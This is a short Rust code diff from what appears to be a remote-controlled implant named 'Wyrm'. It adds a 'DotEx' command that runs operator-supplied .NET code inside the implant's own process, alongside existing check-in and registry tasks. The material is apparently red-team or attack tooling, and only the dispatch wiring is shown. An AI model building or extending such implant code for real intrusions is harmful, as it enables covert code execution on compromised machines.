@@ -31,6 +31,7 @@ use windows_sys::{
 use crate::{
     comms::comms_http_check_in,
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
+    execute::dotnet::execute_dotnet_current_process,
     native::{
         accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
@@ -317,6 +318,9 @@ impl Wyrm {
                 Command::RegDelete => {
                     let result = reg_del(&task.metadata);
                     self.push_completed_task(&task, result);
+                }
+                Command::DotEx => {
+                    execute_dotnet_current_process(&task.metadata);
                 }
             }
         }
